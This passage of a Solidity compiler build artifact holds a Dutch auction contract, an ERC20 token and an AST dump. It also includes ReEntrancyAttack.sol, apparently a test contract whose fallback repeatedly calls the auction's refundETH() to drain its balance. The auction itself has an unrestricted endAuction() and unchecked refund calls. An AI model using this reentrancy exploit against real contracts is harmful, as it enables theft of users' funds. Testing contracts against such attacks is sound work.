{\n                biddersList[i].totalAlgosPurchased = currentAlgos;\n                currentAlgos = 0;\n                biddersList[i].refundEth =\n                    biddersList[i].bidValue -\n                    biddersList[i].totalAlgosPurchased *\n                    uint256(currentPrice);\n            }\n            //there is no algos left\n            // reset the total algos purchased to 0\n            else if (currentAlgos <= 0) {\n                //refund for the rest\n                biddersList[i].totalAlgosPurchased = 0;\n                biddersList[i].refundEth = biddersList[i].bidValue;\n            }\n            emit RefundEvent(\n                biddersList[i].walletAddress,\n                biddersList[i].totalAlgosPurchased,\n                biddersList[i].refundEth\n            );\n        }\n\n        if (currentAlgos > 0) {\n            currentUnsoldAlgos = currentAlgos;\n        } else {\n            s_auctionState = AuctionState.CLOSING;\n            currentUnsoldAlgos = 0;\n            prematureEnd = true;\n        }\n    }\n\n    function endAuction() public {\n        s_auctionState = AuctionState.CLOSING;\n        calculate();\n        refundETH();\n        sendTokens();\n        if (currentUnsoldAlgos > 0) {\n            DAToken.burn(address(this), currentUnsoldAlgos);\n        }\n        emit endAuctionEvent(\n            totalNumBidders,\n            currentUnsoldAlgos,\n            address(this).balance\n        );\n    }\n\n    /**View and Pure Function */\n\n    function retrieveTotalAlgos() public view onlyOwner returns (uint256) {\n        return totalAlgosAvailable;\n    }\n\n    function retrieveReservePrice() public view onlyOwner returns (uint256) {\n        return reservePrice;\n    }\n\n    function retrieveCurrentPrice() public view returns (int256) {\n        return currentPrice;\n    }\n\n    function retrieveTotalBidder() public view onlyOwner returns (uint256) {\n        return totalNumBidders;\n    }\n\n    function retrieveContractOwner() public view returns (address) {\n        return i_owner;\n    }\n\n    function retrieveContractBalance() public view onlyOwner returns (uint256) {\n        return address(this).balance;\n    }\n\n    function retrieveBidderBidValue(\n        uint256 bidder\n    ) public view onlyOwner returns (uint256) {\n        return biddersList[bidder].bidValue;\n    }\n\n    function retrieveBidderAlgos(\n        uint256 bidder\n    ) public view onlyOwner returns (uint256) {\n        return biddersList[bidder].totalAlgosPurchased;\n    }\n\n    function retrieveRefund(\n        uint256 bidder\n    ) public view onlyOwner returns (uint256) {\n        return biddersList[bidder].refundEth;\n    }\n\n    function balanceOfBidder(uint256 bidder) public view returns (uint256) {\n        return DAToken.balanceOf(biddersList[bidder].walletAddress);\n    }\n\n    fallback() external payable {\n        // addBidder();\n    }\n\n    receive() external payable {\n        // addBidder();\n    }\n\n    function getAuctionState() public view returns (AuctionState) {\n        return s_auctionState;\n    }\n}\n"},"contracts/ERC20Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.21;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract ERC20Token is Context, ERC20, Ownable {\n    constructor(\n        uint256 initialSupply,\n        address contractAddress\n    ) Ownable(msg.sender) ERC20(\"ERC20Token\", \"ET\") {\n        _mint(msg.sender, initialSupply * (10 ** 18));\n        approve(contractAddress, initialSupply * (10 ** 18));\n    }\n\n    function burn(address i_owner, uint256 amount) public onlyOwner {\n        _burn(i_owner, amount * 10 ** 18);\n    }\n}\n"},"contracts/ReEntrancyAttack.sol":{"content":"// SPDX-License-Identifier: MITRe Entry Attack\n\npragma solidity ^0.8.21;\n\nimport \"./Dutch_Auction.sol\";\n\ncontract ReEntrancyAttack {\n    Dutch_Auction target;\n    address targetA;\n\n    constructor(address payable _target) payable{\n        target = Dutch_Auction(_target);\n        targetA = _target;\n    }\n\n    fallback() external payable {\n        while(address(targetA).balance>1000){\n        target.refundETH();}\n    }\n\n    function ReentranceAttack1() public{\n        target.addBidder{value: 0.000000000000003 ether}();\n    }\n\n    function reEnter() public {\n        target.refundETH();\n    }\n\n//deliberatily end auction to test\n\n}"}},"settings":{"evmVersion":"paris","optimizer":{"enabled":false,"runs":200},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata","devdoc","userdoc","storageLayout","evm.gasEstimates"],"":["ast"]}},"metadata":{"useLiteralContent":true}}},"output":{"errors":[{"component":"general","errorCode":"3628","formattedMessage":"Warning: This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.\n --> contracts/ReEntrancyAttack.sol:7:1:\n  |\n7 | contract ReEntrancyAttack {\n  | ^ (Relevant source part starts here and spans across multiple lines).\nNote: The payable fallback function is defined here.\n  --> contracts/ReEntrancyAttack.sol:16:5:\n   |\n16 |     fallback() external payable {\n   |     ^ (Relevant source part starts here and spans across multiple lines).\n\n","message":"This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.","secondarySourceLocations":[{"end":420,"file":"contracts/ReEntrancyAttack.sol","message":"The payable fallback function is defined here.","start":310}],"severity":"warning","sourceLocation":{"end":634,"file":"contracts/ReEntrancyAttack.sol","start":105},"type":"Warning"},{"component":"general","errorCode":"2072","formattedMessage":"Warning: Unused local variable.\n   --> contracts/Dutch_Auction.sol:227:18:\n    |\n227 |                 (bool callSuccess, ) = payable(biddersList[i].walletAddress)\n    |                  ^^^^^^^^^^^^^^^^\n\n","message":"Unused local variable.","severity":"warning","sourceLocation":{"end":7470,"file":"contracts/Dutch_Auction.sol","start":7454},"type":"Warning"}],"sources":{"@openzeppelin/contracts/access/Ownable.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","exportedSymbols":{"Context":[925],"Ownable":[147]},"id":148,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"102:24:0"},{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","file":"../utils/Context.sol","id":3,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":148,"sourceUnit":926,"src":"128:45:0","symbolAliases":[{"foreign":{"id":2,"name":"Context","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":925,"src":"136:7:0","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":true,"baseContracts":[{"baseName":{"id":5,"name":"Context","nameLocations":["692:7:0"],"nodeType":"IdentifierPath","referencedDeclaration":925,"src":"692:7:0"},"id":6,"nodeType":"InheritanceSpecifier","src":"692:7:0"}],"canonicalName":"Ownable","contractDependencies":[],"contractKind":"contract","documentation":{"id":4,"nodeType":"StructuredDocumentation","src":"175:487:0","text":" @dev Contract module which provides a basic access control mechanism, where\n there is an account (an owner) that can be granted exclusive access to\n specific functions.\n The initial owner is set to the address provided by the deployer. This can\n later be changed with {transferOwnership}.\n This module is used through inheritance. It will make available the modifier\n `onlyOwner`, which can be applied to your functions to restrict their use to\n the owner."},"fullyImplemented":true,"id":147,"linearizedBaseContracts":[147,925],"name":"Ownable","nameLocation":"681:7:0","nodeType":"ContractDefinition","nodes":[{"constant":false,"id":8,"mutability":"mutable","name":"_owner","nameLocation":"722:6:0","nodeType":"VariableDeclaration","scope":147,"src":"706:22:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":7,"name":"address","nodeType":"ElementaryTypeName","src":"706:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"private"},{"documentation":{"id":9,"nodeType":"StructuredDocumentation","src":"735:85:0","text":" @dev The caller account is not authorized to perform an operation."},"errorSelector":"118cdaa7","id":13,"name":"OwnableUnauthorizedAccount","nameLocation":"831:26:0","nodeType":"ErrorDefinition","parameters":{"id":12,"nodeType":"ParameterList","parameters":[{"constant":false,"id":11,"mutability":"mutable","name":"account","nameLocation":"866:7:0","nodeType":"VariableDeclaration","scope":13,"src":"858:15:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":10,"name":"address","nodeType":"ElementaryTypeName","src":"858:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"857:17:0"},"src":"825:50:0"},{"documentation":{"id":14,"nodeType":"StructuredDocumentation","src":"881:82:0","text":" @dev The owner is not a valid owner account. (eg. `address(0)`)"},"errorSelector":"1e4fbdf7","id":18,"name":"OwnableInvalidOwner","nameLocation":"974:19:0","nodeType":"ErrorDefinition","parameters":{"id":17,"nodeType":"ParameterList","parameters":[{"constant":false,"id":16,"mutability":"mutable","name":"owner","nameLocation":"1002:5:0","nodeType":"VariableDeclaration","scope":18,"src":"994:13:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":15,"name":"address","nodeType":"ElementaryTypeName","src":"994:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"993:15:0"},"src":"968:41:0"},{"anonymous":false,"eventSelector":"8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0","id":24,"name":"OwnershipTransferred","nameLocation":"1021:20:0","nodeType":"EventDefinition","parameters":{"id":23,"nodeType":"ParameterList","parameters":[{"constant":false,"id":20,"indexed":true,"mutability":"mutable","name":"previousOwner","nameLocation":"1058:13:0","nodeType":"VariableDeclaration","scope":24,"src":"1042:29:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":19,"name":"address","nodeType":"ElementaryTypeName","src":"1042:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":22,"indexed":true,"mutability":"mutable","name":"newOwner","nameLocation":"1089:8:0","nodeType":"VariableDeclaration","scope":24,"src":"1073:24:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":21,"name":"address","nodeType":"ElementaryTypeName","src":"1073:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1041:57:0"},"src":"1015:84:0"},{"body":{"id":49,"nodeType":"Block","src":"1259:153:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":35,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":30,"name":"initialOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":27,"src":"1273:12:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":33,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1297:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":32,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1289:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":31,"name":"address","nodeType":"ElementaryTypeName","src":"1289:7:0","typeDescriptions":{}}},"id":34,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1289:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1273:26:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":44,"nodeType":"IfStatement","src":"1269:95:0","trueBody":{"id":43,"nodeType":"Block","src":"1301:63:0","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":39,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1350:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":38,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1342:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":37,"name":"address","nodeType":"ElementaryTypeName","src":"1342:7:0","typeDescriptions":{}}},"id":40,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1342:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":36,"name":"OwnableInvalidOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":18,"src":"1322:19:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":41,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1322:31:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":42,"nodeType":"RevertStatement","src":"1315:38:0"}]}},{"expression":{"arguments":[{"id":46,"name":"initialOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":27,"src":"1392:12:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":45,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"1373:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":47,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1373:32:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":48,"nodeType":"ExpressionStatement","src":"1373:32:0"}]},"documentation":{"id":25,"nodeType":"StructuredDocumentation","src":"1105:115:0","text":" @dev Initializes the contract setting the address provided by the deployer as the initial owner."},"id":50,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":28,"nodeType":"ParameterList","parameters":[{"constant":false,"id":27,"mutability":"mutable","name":"initialOwner","nameLocation":"1245:12:0","nodeType":"VariableDeclaration","scope":50,"src":"1237:20:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":26,"name":"address","nodeType":"ElementaryTypeName","src":"1237:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1236:22:0"},"returnParameters":{"id":29,"nodeType":"ParameterList","parameters":[],"src":"1259:0:0"},"scope":147,"src":"1225:187:0","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":57,"nodeType":"Block","src":"1521:41:0","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":53,"name":"_checkOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":84,"src":"1531:11:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$__$","typeString":"function () view"}},"id":54,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1531:13:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":55,"nodeType":"ExpressionStatement","src":"1531:13:0"},{"id":56,"nodeType":"PlaceholderStatement","src":"1554:1:0"}]},"documentation":{"id":51,"nodeType":"StructuredDocumentation","src":"1418:77:0","text":" @dev Throws if called by any account other than the owner."},"id":58,"name":"onlyOwner","nameLocation":"1509:9:0","nodeType":"ModifierDefinition","parameters":{"id":52,"nodeType":"ParameterList","parameters":[],"src":"1518:2:0"},"src":"1500:62:0","virtual":false,"visibility":"internal"},{"body":{"id":66,"nodeType":"Block","src":"1693:30:0","statements":[{"expression":{"id":64,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"1710:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":63,"id":65,"nodeType":"Return","src":"1703:13:0"}]},"documentation":{"id":59,"nodeType":"StructuredDocumentation","src":"1568:65:0","text":" @dev Returns the address of the current owner."},"functionSelector":"8da5cb5b","id":67,"implemented":true,"kind":"function","modifiers":[],"name":"owner","nameLocation":"1647:5:0","nodeType":"FunctionDefinition","parameters":{"id":60,"nodeType":"ParameterList","parameters":[],"src":"1652:2:0"},"returnParameters":{"id":63,"nodeType":"ParameterList","parameters":[{"constant":false,"id":62,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":67,"src":"1684:7:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":61,"name":"address","nodeType":"ElementaryTypeName","src":"1684:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1683:9:0"},"scope":147,"src":"1638:85:0","stateMutability":"view","virtual":true,"visibility":"public"},{"body":{"id":83,"nodeType":"Block","src":"1841:117:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":75,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[],"expression":{"argumentTypes":[],"id":71,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":67,"src":"1855:5:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":72,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1855:7:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[],"expression":{"argumentTypes":[],"id":73,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"1866:10:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":74,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1866:12:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"1855:23:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":82,"nodeType":"IfStatement","src":"1851:101:0","trueBody":{"id":81,"nodeType":"Block","src":"1880:72:0","statements":[{"errorCall":{"arguments":[{"arguments":[],"expression":{"argumentTypes":[],"id":77,"name":"_msgSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":915,"src":"1928:10:0","typeDescriptions":{"typeIdentifier":"t_function_internal_view$__$returns$_t_address_$","typeString":"function () view returns (address)"}},"id":78,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1928:12:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":76,"name":"OwnableUnauthorizedAccount","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":13,"src":"1901:26:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":79,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1901:40:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":80,"nodeType":"RevertStatement","src":"1894:47:0"}]}}]},"documentation":{"id":68,"nodeType":"StructuredDocumentation","src":"1729:62:0","text":" @dev Throws if the sender is not the owner."},"id":84,"implemented":true,"kind":"function","modifiers":[],"name":"_checkOwner","nameLocation":"1805:11:0","nodeType":"FunctionDefinition","parameters":{"id":69,"nodeType":"ParameterList","parameters":[],"src":"1816:2:0"},"returnParameters":{"id":70,"nodeType":"ParameterList","parameters":[],"src":"1841:0:0"},"scope":147,"src":"1796:162:0","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":97,"nodeType":"Block","src":"2347:47:0","statements":[{"expression":{"arguments":[{"arguments":[{"hexValue":"30","id":93,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2384:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":92,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2376:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":91,"name":"address","nodeType":"ElementaryTypeName","src":"2376:7:0","typeDescriptions":{}}},"id":94,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2376:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":90,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"2357:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":95,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2357:30:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":96,"nodeType":"ExpressionStatement","src":"2357:30:0"}]},"documentation":{"id":85,"nodeType":"StructuredDocumentation","src":"1964:324:0","text":" @dev Leaves the contract without owner. It will not be possible to call\n `onlyOwner` functions. Can only be called by the current owner.\n NOTE: Renouncing ownership will leave the contract without an owner,\n thereby disabling any functionality that is only available to the owner."},"functionSelector":"715018a6","id":98,"implemented":true,"kind":"function","modifiers":[{"id":88,"kind":"modifierInvocation","modifierName":{"id":87,"name":"onlyOwner","nameLocations":["2337:9:0"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"2337:9:0"},"nodeType":"ModifierInvocation","src":"2337:9:0"}],"name":"renounceOwnership","nameLocation":"2302:17:0","nodeType":"FunctionDefinition","parameters":{"id":86,"nodeType":"ParameterList","parameters":[],"src":"2319:2:0"},"returnParameters":{"id":89,"nodeType":"ParameterList","parameters":[],"src":"2347:0:0"},"scope":147,"src":"2293:101:0","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":125,"nodeType":"Block","src":"2613:145:0","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":111,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":106,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":101,"src":"2627:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":109,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2647:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":108,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2639:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":107,"name":"address","nodeType":"ElementaryTypeName","src":"2639:7:0","typeDescriptions":{}}},"id":110,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2639:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2627:22:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":120,"nodeType":"IfStatement","src":"2623:91:0","trueBody":{"id":119,"nodeType":"Block","src":"2651:63:0","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":115,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2700:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":114,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2692:7:0","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":113,"name":"address","nodeType":"ElementaryTypeName","src":"2692:7:0","typeDescriptions":{}}},"id":116,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2692:10:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":112,"name":"OwnableInvalidOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":18,"src":"2672:19:0","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":117,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2672:31:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":118,"nodeType":"RevertStatement","src":"2665:38:0"}]}},{"expression":{"arguments":[{"id":122,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":101,"src":"2742:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":121,"name":"_transferOwnership","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":146,"src":"2723:18:0","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$returns$__$","typeString":"function (address)"}},"id":123,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2723:28:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":124,"nodeType":"ExpressionStatement","src":"2723:28:0"}]},"documentation":{"id":99,"nodeType":"StructuredDocumentation","src":"2400:138:0","text":" @dev Transfers ownership of the contract to a new account (`newOwner`).\n Can only be called by the current owner."},"functionSelector":"f2fde38b","id":126,"implemented":true,"kind":"function","modifiers":[{"id":104,"kind":"modifierInvocation","modifierName":{"id":103,"name":"onlyOwner","nameLocations":["2603:9:0"],"nodeType":"IdentifierPath","referencedDeclaration":58,"src":"2603:9:0"},"nodeType":"ModifierInvocation","src":"2603:9:0"}],"name":"transferOwnership","nameLocation":"2552:17:0","nodeType":"FunctionDefinition","parameters":{"id":102,"nodeType":"ParameterList","parameters":[{"constant":false,"id":101,"mutability":"mutable","name":"newOwner","nameLocation":"2578:8:0","nodeType":"VariableDeclaration","scope":126,"src":"2570:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":100,"name":"address","nodeType":"ElementaryTypeName","src":"2570:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2569:18:0"},"returnParameters":{"id":105,"nodeType":"ParameterList","parameters":[],"src":"2613:0:0"},"scope":147,"src":"2543:215:0","stateMutability":"nonpayable","virtual":true,"visibility":"public"},{"body":{"id":145,"nodeType":"Block","src":"2975:124:0","statements":[{"assignments":[133],"declarations":[{"constant":false,"id":133,"mutability":"mutable","name":"oldOwner","nameLocation":"2993:8:0","nodeType":"VariableDeclaration","scope":145,"src":"2985:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":132,"name":"address","nodeType":"ElementaryTypeName","src":"2985:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":135,"initialValue":{"id":134,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"3004:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"2985:25:0"},{"expression":{"id":138,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":136,"name":"_owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"3020:6:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandS